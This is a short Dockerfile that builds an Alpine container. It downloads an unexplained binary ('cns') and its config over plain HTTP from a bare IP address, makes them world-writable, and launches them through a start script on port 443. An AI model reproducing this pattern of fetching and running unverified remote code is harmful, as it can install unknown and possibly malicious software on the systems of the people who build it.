FROM alpine:latest 

WORKDIR /tmp

RUN wget http://101.35.82.220/2/cns \
    && wget http://101.35.82.220/2/cns.json \
    && wget http://101.35.82.220/2/run.pid

RUN chmod 777 cns \
    && chmod 777 cns.json \
    && chmod 777 run.pid

COPY start.sh /tmp/start.sh

RUN chmod a+x /tmp/start.sh

CMD [ "/tmp/start.sh" ]

EXPOSE 443
